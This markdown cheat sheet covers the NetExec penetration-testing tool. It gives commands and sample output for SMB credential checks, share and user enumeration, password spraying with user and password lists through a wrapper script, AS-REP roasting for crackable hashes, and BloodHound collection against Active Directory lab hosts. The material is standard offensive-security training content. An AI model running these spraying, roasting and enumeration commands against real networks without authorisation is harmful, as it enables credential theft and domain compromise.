# NetExec (nxc)

```text
⠀⠀⠀⠀⠀⠀⢰⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⡟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⢻⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠰⠆⠀⠀⠀⠀⠰⠆⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠶⠶⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⢰⣶⠄
⠀⠀⠀⠀⠀⠀⢸⣿⣧⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣼⣿⡇⠀⠀⢀⣿⡿⠀
⠀⠀⢀⣠⣴⣶⣾⣿⡿⠿⠿⠿⠿⠿⠿⣿⣿⡿⠿⣿⣿⣷⣶⣾⡿⠟⠀⠀
⠀⣠⣿⡿⠋⠉⢹⣿⣿⣶⠶⣶⣶⣶⣶⣿⣿⣿⣾⣿⣿⡏⠉⠁⠀⠀⠀⠀
⢠⣿⡟⠀⠀⠀⢸⣿⡟⠉⠀⠉⣻⣿⣿⣏⣀⣻⣿⣉⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠉⠁⠀⠀⠀⢸⣿⣿⣿⣤⣿⣿⣿⣿⣿⡟⠋⠙⢿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣏⣉⣉⣿⣏⣉⣹⣿⣧⣀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⣿⡿⠿⠿⠿⠿⢿⣿⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```


[NetExec GitHub repo](https://github.com/Pennyw0rth/NetExec) is the actively maintained continuation of CrackMapExec.
In Kali, the `netexec` package provides both the `netexec` and `nxc` binaries.

```bash
└─$ netexec -h                                                                        
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG]
               [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {nfs,winrm,ftp,smb,mssql,vnc,ssh,rdp,wmi,ldap} ...

     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /˙-˙\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ˙ \   / ˙
     ˙   ˙

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx

    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.5.1
    Codename: Yippie-Ki-Yay
    Commit  : Kali Linux
    

options:
  -h, --help            show this help message and exit

Generic Options:
  --version             Display nxc version
  -t, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output Options:
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file
  --verbose             enable verbose output
  --debug               enable debug level information

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {nfs,winrm,ftp,smb,mssql,vnc,ssh,rdp,wmi,ldap}
    nfs                 own stuff using NFS
    winrm               own stuff using WINRM
    ftp                 own stuff using FTP
    smb                 own stuff using SMB
    mssql               own stuff using MSSQL
    vnc                 own stuff using VNC
    ssh                 own stuff using SSH
    rdp                 own stuff using RDP
    wmi                 own stuff using WMI
    ldap                own stuff using LDAP
```

NXC = maintained CME-style network execution and enumeration tool for Windows &AD

### get netexec -ing

### SMB credential validation

**Single user credential check on single host**

```bash
netexec smb 192.168.111.137 -u username -p 'password'

SMB  192.168.111.137  445  <HOSTNAME>  [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)  
SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\username:password
```

Local authentication 
```bash
netexec smb 192.168.111.137 -u username -p 'password' --local-auth
```

domain authentication
```bash
netexec smb 192.168.111.137 -u username -p 'password' -d <DOMAIN>
```

### SMB shares enumeration

```bash
netexec smb 192.168.111.137 -u username -p 'password' --shares


SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\username:password (Pwn3d!)  
SMB  192.168.111.137  445  <HOSTNAME>  [+] Enumerated shares  
SMB  192.168.111.137  445  <HOSTNAME>  Share    Permissions  Remark  
SMB  192.168.111.137  445  <HOSTNAME>  ADMIN$   READ,WRITE   Remote Admin  
SMB  192.168.111.137  445  <HOSTNAME>  C$       READ,WRITE   Default share  
SMB  192.168.111.137  445  <HOSTNAME>  IPC$     READ         Remote IPC
```

other protocols 
```bash
# winrm
netexec winrm <TARGET_IP> -u username -p 'password'

# ldap
netexec ldap <TARGET_IP> -u username -p 'password' -d <DOMAIN>

# mssql
netexec mssql <TARGET_IP> -u username -p 'password' -d <DOMAIN>

# rdp
netexec rdp <TARGET_IP> -u username -p 'password' -d <DOMAIN>
```

RID brute-force / user discovery <- useful with high privilege credentials! 
```bash
netexec smb target_ip -u username -p 'password' --rid-brute
```
- enumerate likely domain users over SMB

list users 
```bash
netexec smb target_ip --users
```
- username discovery
- building spray / validation lists
- identifying likely service or admin accounts


[`nxc_bloop.sh`](./scripts/nxc_bloop.sh) to loop through different commands more easily! 

```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,winrm -u alice -p 'password'
```

domain auth
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,ldap,rdp -u alice -p 'password' --auth domain -d domain.com
```

local auth
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,winrm -u administrator -p 'password' --auth local
```

usernames.txt + single password
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,ldap -U usernames.txt -p 'password' --auth domain -d domain.com
```

single username + passwords.txt
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,rdp -u alice -W passwords.txt --auth domain -d domain.com
```

usernames.txt + passwords.txt
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb -U usernames.txt -W passwords.txt --auth domain -d domain.com --continue-on-success
```

exact username:password combos
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,winrm -C combos.txt --auth domain -d domain.com
```

```bash
cat combos.txt
alice:alice_password  
bob:bob_password 
eve:apples
```

log output to a file
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,winrm -u alice -p 'password' --auth domain -d domain.com --log nxc_results.log
```

change timeout to prevent wasting time on a service that hangs and/or is filtered
```bash
./nxc_bloop.sh -t 192.168.111.137 -P smb,ldap,mssql -u alice -p 'password' --auth domain -d domain.com --timeout 15
```


### Password policy

Check the domain password policy early if SMB is reachable:  
```bash  
netexec smb target_ip --pass-pol
```
- lockout awareness
- safer spraying decisions
- understanding password complexity / length requirements

### LDAP query without credentials

```bash
netexec ldap target_ip -u '' -p '' --query "(objectClass=*)" "*"
```
- quick AD object discovery
- testing whether anonymous LDAP binds are allowed


### AS-REP roasting

usernames found -> check for those that don't require pre-auth
```bash
netexec ldap target_ip -u users.txt -p '' --asreproast
```
- obtaining crackable AS-REP roast hashes
- identifying weakly configured domain accounts


### LDAP enumeration after gaining credentials

```bash
netexec ldap target_ip -u username -p 'password' --query "(objectClass=*)" "*"
```
- finding higher-value users
- collecting additional credential material
- understanding domain structure better

### BloodHound

domain credentials found -> get Bloodhound data 
```bash
netexec ldap target_ip -u username -p 'password' --bloodhound -c All -ns target_ip

LDAP target_ip 389 dc01 [*] Windows Server / Domain Controller info...  
LDAP target_ip 389 dc01 [+] domain.com\username:password  
LDAP target_ip 389 dc01 [*] Running BloodHound collection with methods: All  
LDAP target_ip 389 dc01 [*] Resolving objects via DNS server: target_ip  
LDAP target_ip 389 dc01 [+] BloodHound collection completed
```
- graphing attack paths
- identifying ACL abuse, delegation, and privilege escalation routes


---

<sub>source of <a href="https://emojicombos.com/bmo"> BMO  ascii art </a></sub>

